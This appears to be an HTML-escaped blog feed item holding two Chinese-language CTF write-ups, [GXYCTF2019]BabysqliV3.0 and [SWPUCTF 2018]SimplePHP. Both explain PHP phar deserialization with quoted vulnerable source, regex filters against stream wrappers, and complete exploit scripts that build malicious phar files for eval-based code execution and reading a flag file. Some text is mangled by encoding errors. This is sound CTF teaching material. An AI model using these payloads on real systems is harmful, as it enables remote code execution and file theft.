item.description:
 &lt;h2 id=&#34;gxyctf2019babysqliv30&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gxyctf2019babysqliv30&#34;&gt;#&lt;/a&gt; [GXYCTF2019]BabysqliV3.0&lt;/h2&gt;
&lt;p&gt;ж–Үд»¶еҢ…еҗ«иҺ·еҸ–жәҗз Ғпјҡ&lt;/p&gt;
&lt;p&gt;home.php&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
session_start();
echo &amp;quot;&amp;lt;meta http-equiv=\&amp;quot;Content-Type\&amp;quot; content=\&amp;quot;text/html; charset=utf-8\&amp;quot; /&amp;gt; &amp;lt;title&amp;gt;Home&amp;lt;/title&amp;gt;&amp;quot;;
error_reporting(0);
if(isset($_SESSION[&#39;user&#39;]))&amp;#123;
    if(isset($_GET[&#39;file&#39;]))&amp;#123;
        if(preg_match(&amp;quot;/.?f.?l.?a.?g.?/i&amp;quot;, $_GET[&#39;file&#39;]))&amp;#123;
            die(&amp;quot;hacker!&amp;quot;);
        &amp;#125;
        else&amp;#123;
            if(preg_match(&amp;quot;/home$/i&amp;quot;, $_GET[&#39;file&#39;]) or preg_match(&amp;quot;/upload$/i&amp;quot;, $_GET[&#39;file&#39;]))&amp;#123;
                $file = $_GET[&#39;file&#39;].&amp;quot;.php&amp;quot;;
            &amp;#125;
            else&amp;#123;
                $file = $_GET[&#39;file&#39;].&amp;quot;.fxxkyou!&amp;quot;;
            &amp;#125;
            echo &amp;quot;ГҘВҪВ“ГҘВүВҚГҘВјВ•Г§В”ВЁГ§ВҡВ„ГҰВҳВҜ &amp;quot;.$file;
            require $file;
        &amp;#125;

    &amp;#125;
    else&amp;#123;
        die(&amp;quot;no permission!&amp;quot;);
    &amp;#125;
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;upload.php&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot; /&amp;gt; 

&amp;lt;form action=&amp;quot;&amp;quot; method=&amp;quot;post&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;
    ГӨВёВҠГӨВј ГҰВ–ВҮГӨВ»В¶
    &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; /&amp;gt;
    &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;submit&amp;quot; value=&amp;quot;ГӨВёВҠГӨВј &amp;quot; /&amp;gt;
&amp;lt;/form&amp;gt;

&amp;lt;?php
error_reporting(0);
class Uploader&amp;#123;
    public $Filename;
    public $cmd;
    public $token;


    function __construct()&amp;#123;
        $sandbox = getcwd().&amp;quot;/uploads/&amp;quot;.md5($_SESSION[&#39;user&#39;]).&amp;quot;/&amp;quot;;
        $ext = &amp;quot;.txt&amp;quot;;
        @mkdir($sandbox, 0777, true);
        if(isset($_GET[&#39;name&#39;]) and !preg_match(&amp;quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&amp;quot;, $_GET[&#39;name&#39;]))&amp;#123;
            $this-&amp;gt;Filename = $_GET[&#39;name&#39;];
        &amp;#125;
        else&amp;#123;
            $this-&amp;gt;Filename = $sandbox.$_SESSION[&#39;user&#39;].$ext;
        &amp;#125;

        $this-&amp;gt;cmd = &amp;quot;echo &#39;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;Master, I want to study rizhan!&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&#39;;&amp;quot;;
        $this-&amp;gt;token = $_SESSION[&#39;user&#39;];
    &amp;#125;

    function upload($file)&amp;#123;
        global $sandbox;
        global $ext;

        if(preg_match(&amp;quot;[^a-z0-9]&amp;quot;, $this-&amp;gt;Filename))&amp;#123;
            $this-&amp;gt;cmd = &amp;quot;die(&#39;illegal filename!&#39;);&amp;quot;;
        &amp;#125;
        else&amp;#123;
            if($file[&#39;size&#39;] &amp;gt; 1024)&amp;#123;
                $this-&amp;gt;cmd = &amp;quot;die(&#39;you are too big (ГўВҖВІГўВ–ВҪ`ГЈВҖВғ)&#39;);&amp;quot;;
            &amp;#125;
            else&amp;#123;
                $this-&amp;gt;cmd = &amp;quot;move_uploaded_file(&#39;&amp;quot;.$file[&#39;tmp_name&#39;].&amp;quot;&#39;, &#39;&amp;quot; . $this-&amp;gt;Filename . &amp;quot;&#39;);&amp;quot;;
            &amp;#125;
        &amp;#125;
    &amp;#125;

    function __toString()&amp;#123;
        global $sandbox;
        global $ext;
        // return $sandbox.$this-&amp;gt;Filename.$ext;
        return $this-&amp;gt;Filename;
    &amp;#125;

    function __destruct()&amp;#123;
        if($this-&amp;gt;token != $_SESSION[&#39;user&#39;])&amp;#123;
            $this-&amp;gt;cmd = &amp;quot;die(&#39;check token falied!&#39;);&amp;quot;;
        &amp;#125;
        eval($this-&amp;gt;cmd);
    &amp;#125;
&amp;#125;

if(isset($_FILES[&#39;file&#39;])) &amp;#123;
    $uploader = new Uploader();
    $uploader-&amp;gt;upload($_FILES[&amp;quot;file&amp;quot;]);
    if(@file_get_contents($uploader))&amp;#123;
        echo &amp;quot;ГӨВёВӢГ©ВқВўГҰВҳВҜГӨВҪ ГӨВёВҠГӨВј Г§ВҡВ„ГҰВ–ВҮГӨВ»В¶ГҜВјВҡ&amp;lt;br&amp;gt;&amp;quot;.$uploader.&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
        echo file_get_contents($uploader);
    &amp;#125;
&amp;#125;

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;еҸҜж“ҚжҺ§зҡ„еҸӮж•°е’Ңе‘Ҫд»Өжү§иЎҢеҮҪж•°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$this-&amp;gt;Filename = $_GET[&#39;name&#39;];

eval($this-&amp;gt;cmd);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;дёҠдј д»Јз Ғ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if(@file_get_contents($uploader))&amp;#123;
        echo &amp;quot;ГӨВёвҖ№Г©ВқВўГҰЛңВҜГӨВҪ ГӨВёЕ ГӨВј Г§ЕЎвҖһГҰвҖ“вҖЎГӨВ»В¶ГҜВјЕЎ&amp;lt;br&amp;gt;&amp;quot;.$uploader.&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
        echo file_get_contents($uploader);
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;и§ӮеҜҹдәҶдёҖдёӢд»Јз ҒпјҢеҸ‘зҺ°еә”иҜҘжҳҜдёҖдёӘеҸҚеәҸеҲ—еҢ–пјҢдҪҶжҳҜжңүжІЎжңүеҸ‘зҺ°еҸҚеәҸеҲ—еҢ–д»Јз ҒпјҢзЎ®е®ҡжҳҜдёҖйҒ“ phar еҸҚеәҸеҲ—еҢ–йўҳзӣ®&lt;/p&gt;
&lt;p&gt;з”ұдәҺдҪҝз”Ёж–Үд»¶ж“ҚдҪңеҮҪж•°й…ҚеҗҲдјӘеҚҸи®® &lt;code&gt;phar://&lt;/code&gt;  иҜ»еҸ–ж–Үд»¶еҸҜи§ҰеҸ‘еҸҚеәҸеҲ—еҢ–пјҢд»ҺиҖҢеҜјиҮҙ rce.&lt;/p&gt;
&lt;p&gt;еҹәдәҺиҝҷж ·зҡ„жғіжі•пјҢиҝҷйҮҢдҫҝдёҠдј дёҖдёӘ &lt;code&gt;.phar&lt;/code&gt;  ж–Үд»¶&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;function __destruct()&amp;#123;
        if($this-&amp;gt;token != $_SESSION[&#39;user&#39;])&amp;#123;
            $this-&amp;gt;cmd = &amp;quot;die(&#39;check token falied!&#39;);&amp;quot;;
        &amp;#125;
        eval($this-&amp;gt;cmd);
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;иҝҷйҮҢиҝҳйңҖиҰҒиҺ·еҫ— user зҡ„ session&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if(isset($_GET[&#39;name&#39;]) and !preg_match(&amp;quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&amp;quot;, $_GET[&#39;name&#39;]))&amp;#123;
            $this-&amp;gt;Filename = $_GET[&#39;name&#39;];
        &amp;#125;
        else&amp;#123;
            $this-&amp;gt;Filename = $sandbox.$_SESSION[&#39;user&#39;].$ext;
        &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;йҡҸдҫҝдёҠдј дёӘж–Үд»¶еҫ—еҲ° session&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BGXYCTF2019%5DBabysqliV3.0/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;жһ„йҖ дёҖдёӢдёҠдј зҡ„ж–Үд»¶&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;class Uploader&amp;#123;
    public $Filename;
    public $cmd;
    public $token;
    function __destruct()&amp;#123;
        eval($this-&amp;gt;cmd);
    &amp;#125;
&amp;#125;

$o = new Uploader();
$o-&amp;gt;cmd = &#39;phpinfo();&#39;;#
$o-&amp;gt;token = &#39;d41d8cd98f00b204e9800998ecf8427e&#39;;
$phar = new Phar(&amp;quot;payload.phar&amp;quot;);
$phar -&amp;gt;startBuffering();
$phar -&amp;gt; setStub(&amp;quot;&amp;lt;?php __HALT_COMPILER();?&amp;quot;);
$phar -&amp;gt; setMetadata($o);
$phar -&amp;gt; addFromString(&amp;quot;test.txt&amp;quot;,&amp;quot;you are hacked&amp;quot;);
$phar -&amp;gt; stopBuffering();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;жҚўдёҖдёӢ cmd е°ұиЎҢдәҶгҖӮ&lt;/p&gt;

 &lt;h2 id=&#34;swpuctf-2018simplephp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#swpuctf-2018simplephp&#34;&gt;#&lt;/a&gt; [SWPUCTF 2018]SimplePHP&lt;/h2&gt;
&lt;p&gt;жңүиҜ»еҸ–ж–Үд»¶пјҢиғҪиҜ»еҲ°еҰӮдёӢж–Үд»¶пјҡ&lt;/p&gt;
&lt;p&gt;file.php?file=index.php/base.php/upload_file.php/function.php/file.php/class.php&lt;/p&gt;
&lt;p&gt;file.php ж–Үд»¶еҶ…е®№еҰӮдёӢпјҡ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
header(&amp;quot;content-type:text/html;charset=utf-8&amp;quot;);  
include &#39;function.php&#39;; 
include &#39;class.php&#39;; 
ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); 
$file = $_GET[&amp;quot;file&amp;quot;] ? $_GET[&#39;file&#39;] : &amp;quot;&amp;quot;; 
if(empty($file)) &amp;#123; 
    echo &amp;quot;&amp;lt;h2&amp;gt;There is no file to show!&amp;lt;h2/&amp;gt;&amp;quot;; 
&amp;#125; 
$show = new Show(); 
if(file_exists($file)) &amp;#123; 
    $show-&amp;gt;source = $file; 
    $show-&amp;gt;_show(); 
&amp;#125; else if (!empty($file))&amp;#123; 
    die(&#39;file doesn\&#39;t exists.&#39;); 
&amp;#125; 
?&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;жіЁж„ҸдҪҝз”Ёзҡ„жҳҜ file_exists () еҮҪж•°гҖӮ&lt;/p&gt;
&lt;p&gt;class.php ж–Үд»¶еҶ…е®№еҰӮдёӢ:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
class C1e4r
&amp;#123;
    public $test;
    public $str;
    public function __construct($name)
    &amp;#123;
        $this-&amp;gt;str = $name;
    &amp;#125;
    public function __destruct()
    &amp;#123;
        $this-&amp;gt;test = $this-&amp;gt;str;
        echo $this-&amp;gt;test;
    &amp;#125;
&amp;#125;

class Show
&amp;#123;
    public $source;
    public $str;
    public function __construct($file)
    &amp;#123;
        $this-&amp;gt;source = $file;   //$this-&amp;gt;source = phar://phar.jpg
        echo $this-&amp;gt;source;
    &amp;#125;
    public function __toString()
    &amp;#123;
        $content = $this-&amp;gt;str[&#39;str&#39;]-&amp;gt;source;
        return $content;
    &amp;#125;
    public function __set($key,$value)
    &amp;#123;
        $this-&amp;gt;$key = $value;
    &amp;#125;
    public function _show()
    &amp;#123;
        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&amp;gt;source)) &amp;#123;
            die(&#39;hacker!&#39;);
        &amp;#125; else &amp;#123;
            highlight_file($this-&amp;gt;source);
        &amp;#125;

    &amp;#125;
    public function __wakeup()
    &amp;#123;
        if(preg_match(&amp;quot;/http|https|file:|gopher|dict|\.\./i&amp;quot;, $this-&amp;gt;source)) &amp;#123;
            echo &amp;quot;hacker~&amp;quot;;
            $this-&amp;gt;source = &amp;quot;index.php&amp;quot;;
        &amp;#125;
    &amp;#125;
&amp;#125;
class Test
&amp;#123;
    public $file;
    public $params;
    public function __construct()
    &amp;#123;
        $this-&amp;gt;params = array();
    &amp;#125;
    public function __get($key)
    &amp;#123;
        return $this-&amp;gt;get($key);
    &amp;#125;
    public function get($key)
    &amp;#123;
        if(isset($this-&amp;gt;params[$key])) &amp;#123;
            $value = $this-&amp;gt;params[$key];
        &amp;#125; else &amp;#123;
            $value = &amp;quot;index.php&amp;quot;;
        &amp;#125;
        return $this-&amp;gt;file_get($value);
    &amp;#125;
    public function file_get($value)
    &amp;#123;
        $text = base64_encode(file_get_contents($value));
        return $text;
    &amp;#125;
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;зңӢеҲ° Class жғіеҲ°еҸҚеәҸеҲ—еҢ–пјҢдҪҶжҳҜжІЎзңӢеҲ°е•Ҙ unserialize () еҮҪж•°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public function _show()
&amp;#123;
    if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&amp;gt;source)) &amp;#123;
        die(&#39;hacker!&#39;);
    &amp;#125; else &amp;#123;
        highlight_file($this-&amp;gt;source);
    &amp;#125;

&amp;#125;
public function __wakeup()
&amp;#123;
    if(preg_match(&amp;quot;/http|https|file:|gopher|dict|\.\./i&amp;quot;, $this-&amp;gt;source)) &amp;#123;
        echo &amp;quot;hacker~&amp;quot;;
        $this-&amp;gt;source = &amp;quot;index.php&amp;quot;;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;иҝҷйҮҢжңүдёӘ WAFпјҢдёҚиғҪзӣҙжҺҘжҹҘзңӢ f1ag.phpпјҢжүҖд»ҘйңҖиҰҒз”Ёе…¶д»–ж–№жі•иҜ»еҸ–гҖӮеҫҲе®№жҳ“жғіеҲ°еҲ©з”Ё file_get_contents жҲ– highlight_file еҮҪж•°иҜ»еҸ–ж–Үд»¶еҶ…е®№гҖӮ&lt;/p&gt;
&lt;p&gt;ж¶үеҸҠзҹҘиҜҶзӮ№пјҡ&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;йҷӨдәҶ unserialize () жқҘеҲ©з”ЁеҸҚеәҸеҲ—еҢ–жјҸжҙһд№ӢеӨ–пјҢиҝҳеҸҜд»ҘеҲ©з”Ё phar ж–Үд»¶д»ҘеәҸеҲ—еҢ–зҡ„еҪўејҸеӯҳеӮЁз”ЁжҲ·иҮӘе®ҡд№үзҡ„ meta-data иҝҷдёҖзү№жҖ§пјҢжү©еӨ§ php еҸҚеәҸеҲ—еҢ–жјҸжҙһзҡ„ж”»еҮ»йқўгҖӮиҜҘж–№жі•еңЁж–Үд»¶зі»з»ҹеҮҪж•°пјҲfile_exists ()гҖҒis_dir () зӯүпјүеҸӮж•°еҸҜжҺ§зҡ„жғ…еҶөдёӢпјҢй…ҚеҗҲ phar:// дјӘеҚҸи®®пјҢеҸҜд»ҘдёҚдҫқиө– unserialize () зӣҙжҺҘиҝӣиЎҢеҸҚеәҸеҲ—еҢ–ж“ҚдҪңгҖӮ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;еҸ—еҪұе“Қзҡ„еҮҪж•°еҰӮдёӢпјҡ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSWPUCTF2018%5DSimplePHP/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;иҝҷйҒ“йўҳж»Ўи¶іиҝҷеҮ дёӘжқЎд»¶пјҡ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;еӯҳеңЁеҸ—еҪұе“Қзҡ„еҮҪж•° file_get_contentsгҖҒfile_existsгҖӮ&lt;/li&gt;
&lt;li&gt;phar ж–Үд»¶иғҪеӨҹдёҠдј еҲ°жңҚеҠЎеҷЁз«ҜгҖӮ&lt;/li&gt;
&lt;li&gt;жІЎжңүиҝҮж»ӨгҖҗ:гҖ‘гҖҒгҖҗ/гҖ‘гҖҒгҖҗpcharгҖ‘зӯүе…ій”®иҜҚгҖӮ&lt;/li&gt;
&lt;li&gt;жңүеҸҜз”Ёзҡ„йӯ”жңҜж–№жі•дҪңдёә вҖңи·іжқҝвҖқгҖӮ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;file_get_contents () еҮҪж•°жҳҜ file_get ж–№жі•дёӯзҡ„пјҢfile_get ж–№жі•еңЁ get ж–№жі•дёӯиў«и°ғз”ЁпјҢget ж–№жі•еңЁ__get йӯ”жңҜж–№жі•дёӯиў«и§ҰеҸ‘пјҡ&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;__getпјҡеҪ“еёҢжңӣи®ҝй—®жҹҗдёӘеҜ№иұЎзҡ„жңӘе®ҡд№үзҡ„жҲ–иҖ…дёҚеҸҜи®ҝй—®зҡ„еұһжҖ§дёҚжҠҘй”ҷпјҢжҲ‘д»¬еҸҜд»ҘеңЁзұ»йҮҢе®ҡд№ү__get ж–№жі•пјҢиҝҷж ·зі»з»ҹеңЁжӯӨеҲ»дјҡиҮӘеҠЁи°ғз”ЁиҜҘж–№жі•&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;еӣ жӯӨиҰҒиҖғиҷ‘и§ҰеҸ‘__get йӯ”жңҜж–№жі•пјҢи®ҝй—®дёҖдёӘ Test зұ»дёӯдёҚеӯҳеңЁзҡ„еұһжҖ§гҖӮ&lt;/p&gt;
&lt;p&gt;Show зұ»жңүиҝҷд№ҲдёҖж®өд»Јз Ғпјҡ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public $source;
public function __toString()
&amp;#123;
    $content = $this-&amp;gt;str[&#39;str&#39;]-&amp;gt;source;
    return $content;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;__toStringпјҡз”ЁдәҺдёҖдёӘзұ»иў«еҪ“жҲҗеӯ—з¬ҰдёІж—¶еә”жҖҺж ·еӣһеә”гҖӮ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;иҝҷйҮҢзҡ„ source еұһжҖ§жҳҜеңЁ Show зұ»йҮҢзҡ„пјҢTest зұ»йҮҢе№¶дёҚеӯҳеңЁпјҢеӣ жӯӨ str [вҖҳstrвҖҷ] = new Test () еҸҜд»Ҙи§ҰеҸ‘__get йӯ”жңҜж–№жі•гҖӮ&lt;/p&gt;
&lt;p&gt;жҺҘдёӢжқҘиҖғиҷ‘и§ҰеҸ‘__toString () зұ»пјҢжүҫеҲ°иғҪиҫ“еҮәдёңиҘҝзҡ„ең°ж–№пјҢеңЁ C1e4r зұ»йҮҢжңүеҰӮдёӢд»Јз Ғпјҡ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public function __destruct()
&amp;#123;
    $this-&amp;gt;test = $this-&amp;gt;str;
    echo $this-&amp;gt;test;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;е®ғдјҡеңЁжҹҗдёӘеҜ№иұЎзҡ„жүҖжңүеј•з”ЁйғҪиў«еҲ йҷӨжҲ–иҖ…еҪ“еҜ№иұЎиў«жҳҫејҸй”ҖжҜҒж—¶жү§иЎҢгҖӮ&lt;/p&gt;
&lt;p&gt;жңҖеҗҺжҖ»з»“жҖқи·ҜеҰӮдёӢпјҡ&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;йҖҡиҝҮ C1e4r зұ»пјҢе°Ҷ str иөӢеҖјдёә show зұ»гҖӮпјҲ$this-&amp;gt;test = $this-&amp;gt;Showпјү&lt;/li&gt;
&lt;li&gt;C1e4r зұ»жңҖеҗҺдјҡ echo $this-&amp;gt;test; и§ҰеҸ‘ Show зұ»зҡ„__toString () йӯ”жңҜж–№жі•&lt;/li&gt;
&lt;li&gt;__toString () йӯ”жңҜж–№жі•жү§иЎҢ $content = this-&gt;str[вҖҳstrвҖҷ]-&gt;source;е°Ҷstr[вҖҳstrвҖҷ]иөӢеҖјдёәTestзұ»пјҢTestзұ»дёӯдёҚеӯҳеңЁsourceеұһжҖ§пјҢи§ҰеҸ‘Testзұ»зҡ„__get(key) йӯ”жңҜж–№жі•гҖӮ&lt;/li&gt;
&lt;li&gt;еӣ дёә $value = &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo&gt;вҲ’&lt;/mo&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;this-&amp;gt;params[&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.77777em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;вҲ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;key]; жүҖд»Ҙ params=array (вҖҳsourceвҖҷ=&amp;gt;вҖҷ/var/www/html/fl1g.phpвҖҷ);&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;exp еҰӮдёӢпјҡ&lt;/p&gt;
&lt;p&gt;йңҖиҰҒе°Ҷ php.ini дёӯзҡ„ phar.readonly йҖүйЎ№и®ҫзҪ®дёә OffпјҢPHPstudy зүҲжң¬еҲҮжҚў 5.5.38гҖӮ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
class C1e4r
&amp;#123;
    public $test;
    public $str;
&amp;#125;
class Test
&amp;#123;
    public $file;
    public $params;
    public function __construct()
    &amp;#123;
        $this-&amp;gt;params = array();
    &amp;#125;
    public function __get($key)
    &amp;#123;
        return $this-&amp;gt;get($key);
    &amp;#125;
    public function get($key)
    &amp;#123;
        if(isset($this-&amp;gt;params[$key])) &amp;#123;
            $value = $this-&amp;gt;params[$key];
        &amp;#125; else &amp;#123;
            $value = &amp;quot;index.php&amp;quot;;
        &amp;#125;
        return $this-&amp;gt;file_get($value);
    &amp;#125;
    public function file_get($value)
    &amp;#123;
        $text = base64_encode(file_get_contents($value));
        return $text;
    &amp;#125;
&amp;#125;
class Show
&amp;#123;
    public $source;
    public $str;
&amp;#125;
$phar = new Phar(&amp;quot;1.phar&amp;quot;); //еҗҺзјҖеҗҚеҝ…йЎ»дёәphar
$phar-&amp;gt;startBuffering();
$phar-&amp;gt;setStub(&amp;quot;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;quot;); 
// еҸҜд»ҘзҗҶи§ЈдёәдёҖдёӘж Үеҝ—пјҢж јејҸдёәxxx&amp;lt;?php xxx; __HALT_COMPILER();?пјҢеүҚйқўеҶ…е®№дёҚйҷҗпјҢдҪҶеҝ…йЎ»д»Ҙ__HALT_COMPILER();?жқҘз»“е°ҫпјҢеҗҰеҲҷpharжү©еұ•е°Ҷж— жі•иҜҶеҲ«иҝҷдёӘж–Үд»¶дёәpharж–Үд»¶
$t = new Test();
$t-&amp;gt;params = array(&amp;quot;source&amp;quot;=&amp;gt;&amp;quot;/var/www/html/f1ag.php&amp;quot;);
$s = new Show();
$s-&amp;gt;str = array(&amp;quot;str&amp;quot;=&amp;gt;$t);
$c = new C1e4r();
$c-&amp;gt;str = $s;
$phar-&amp;gt;setMetadata($c); //е°ҶиҮӘе®ҡд№үзҡ„meta-dataеӯҳе…Ҙmanifest
$phar-&amp;gt;addFromString(&amp;quot;test.txt&amp;quot;, &amp;quot;test&amp;quot;); //ж·»еҠ иҰҒеҺӢзј©зҡ„ж–Үд»¶
//зӯҫеҗҚиҮӘеҠЁи®Ўз®—
$phar-&amp;gt;stopBuffering();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;жҠ“еҢ…дёҠдј ж”№еҗҺзјҖпјҡ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSWPUCTF2018%5DSimplePHP/wIq9Vx.png&#34; alt=&#34;wIq9Vx&#34;&gt;&lt;/p&gt;
&lt;p&gt;жүҫеҲ°ж–Үд»¶и·Ҝеҫ„пјҢйҖҡиҝҮжҹҘзңӢ function.php еҸҜеҫ—зҹҘж–Үд»¶еӯҳеңЁ upload ж–Үд»¶еӨ№еҶ…пјҢжҒ°еҘҪиҝҷдёӘж–Үд»¶еӨ№еҸҜд»Ҙи®ҝй—® qwqгҖӮ&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;file.php?file=phar://upload/090b0844ab952f0df2b28e1f9bc24dad.jpg&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSWPUCTF2018%5DSimplePHP/woSN5R.png&#34; alt=&#34;woSN5R&#34;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;base64 и§Јз Ғеҫ—еҲ° flag&lt;/p&gt;
&lt;p&gt;еҮәиҮӘпјҡ&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2hhd3Jvb3QuY2MvMTE0MS5odG1s&#34;&gt;https://www.shawroot.cc/1141.html&lt;/span&gt;&lt;/p&gt;
